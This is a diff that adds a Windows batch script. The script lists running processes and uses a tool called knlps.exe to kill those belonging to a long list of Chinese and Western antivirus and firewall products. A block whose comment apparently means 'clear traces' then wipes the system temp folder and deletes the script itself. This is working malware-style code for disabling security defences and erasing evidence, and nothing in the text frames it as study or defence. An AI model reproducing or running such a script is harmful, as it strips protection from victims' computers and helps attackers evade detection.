@@ -1,0 +1,38 @@
+@echo off
+
+knlps.exe -l >PID.txt
+
+findstr /i "RavMon.exe" PID.txt >>rav.txt
+findstr /i "RavMonD.exe" PID.txt >>rav.txt
+findstr /i "CCenter.exe" PID.txt >>rav.txt
+findstr /i "avp.exe" PID.txt >>rav.txt
+findstr /i "avp.exe" PID.txt >>rav.txt
+findstr /i "KVMonXP.kxp" PID.txt >>rav.txt
+findstr /i "KVxp.kxp" PID.txt >>rav.txt
+findstr /i "kvsrvxp.exe" PID.txt >>rav.txt
+findstr /i "kvwsc.exe" PID.txt >>rav.txt
+findstr /i "KAVStart.exe" PID.txt >>rav.txt
+findstr /i "KWatch.exe" PID.txt >>rav.txt
+findstr /i "KPFW32.exe" PID.txt >>rav.txt
+findstr /i "KPFWSvc.exe" PID.txt >>rav.txt
+findstr /i "rfwsrv.exe" PID.txt >>rav.txt
+findstr /i "rfwproxy.exe" PID.txt >>rav.txt
+findstr /i "rfwmain.exe" PID.txt >>rav.txt
+findstr /i "Navapw32.exe" PID.txt >>rav.txt
+findstr /i "Navapsvc.exe" PID.txt >>rav.txt
+findstr /i "rising.exe" PID.txt >>rav.txt
+findstr /i "Symantec.exe" PID.txt >>rav.txt
+findstr /i "rtvscan.exe" PID.txt >>rav.txt
+findstr /i "ccApp.exe" PID.txt >>rav.txt
+findstr /i "VTPRay.exe" PID.txt >>rav.txt
+findstr /i "360tray.exe" PID.txt >>rav.txt
+for /f "eol=; tokens=1 delims= " %%1 in (rav.txt) do knlps.exe -k %%1
+
+
+
+
+
+
+::=========Çå³ýºÛ¼£============================
+RD /S /Q %systemroot%\temp\
+del %0
